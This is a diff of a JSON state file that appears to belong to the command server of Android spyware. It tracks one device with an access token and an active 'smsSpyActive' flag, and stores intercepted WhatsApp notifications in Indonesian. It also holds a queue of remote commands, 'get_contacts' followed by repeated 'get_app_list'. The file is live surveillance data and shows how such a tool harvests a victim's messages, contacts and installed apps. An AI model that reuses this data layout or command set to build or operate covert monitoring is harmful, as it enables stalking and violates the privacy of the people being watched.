@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777179292018,
+    "lastSeen": 1777179300838,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Pegasus-X Room",
+        "content": "‎12 pesan baru",
+        "time": "26/04 13:06",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777179302287
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Pegasus-X Room",
+        "content": "‎12 pesan baru",
+        "time": "26/04 13:05",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777179294371
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎Pegasus-X Room (12 pesan): ~ lang",
@@ -4003,22 +4019,6 @@
         "time": "26/04 11:26",
         "pkg": "com.whatsapp",
         "receivedAt": 1777173328336
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎1202 pesan dari 19 chat",
-        "time": "26/04 11:26",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173328333
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎1203 pesan dari 19 chat",
-        "time": "26/04 11:26",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173328329
       }
     ],
     "galleryPhotos": [],
@@ -4043,6 +4043,41 @@
         "type": "get_contacts",
         "payload": {},
         "sentAt": 1777179292106
+      },
+      {
+        "type": "get_app_list",
+        "payload": {},
+        "sentAt": 1777179299717
+      },
+      {
+        "type": "get_app_list",
+        "payload": {},
+        "sentAt": 1777179300373
+      },
+      {
+        "type": "get_app_list",
+        "payload": {},
+        "sentAt": 1777179301124
+      },
+      {
+        "type": "get_app_list",
+        "payload": {},
+        "sentAt": 1777179301151
+      },
+      {
+        "type": "get_app_list",
+        "payload": {},
+        "sentAt": 1777179301198
+      },
+      {
+        "type": "get_app_list",
+        "payload": {},
+        "sentAt": 1777179301404
+      },
+      {
+        "type": "get_app_list",
+        "payload": {},
+        "sentAt": 1777179301530
       }
     ],
     "online": true,
